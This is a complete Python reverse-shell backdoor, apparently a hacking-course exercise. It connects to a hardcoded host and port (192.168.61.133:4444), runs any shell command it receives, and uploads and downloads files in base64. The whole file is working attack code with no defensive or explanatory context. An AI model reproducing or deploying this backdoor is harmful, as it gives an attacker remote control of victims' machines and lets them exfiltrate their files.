#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
    def __init__(self, attacker, attacker_port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((attacker, attacker_port))

    def reliable_stream_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())


    def reliable_stream_receive(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return '[+] Changing working directory to ' + path

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Upload Succesful'

    def run_backdoor(self):
        while True:
            try:
                received_data = self.reliable_stream_receive()
                if received_data[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif received_data[0] == 'cd' and len(received_data) > 1:
                    command_result = self.change_working_directory_to(received_data[1])
                elif received_data[0] == 'download':
                    command_result = self.read_file(received_data[1]).decode()
                elif received_data[0] == 'upload':
                    command_result = self.write_file(received_data[1], received_data[2])
                else:
                    command_result = self.execute_system_command(received_data).decode()
            except Exception as e:
                command_result = '[-] Error during command execution'
            self.reliable_stream_send(command_result)





my_backdoor = Backdoor('192.168.61.133', 4444)
my_backdoor.run_backdoor()
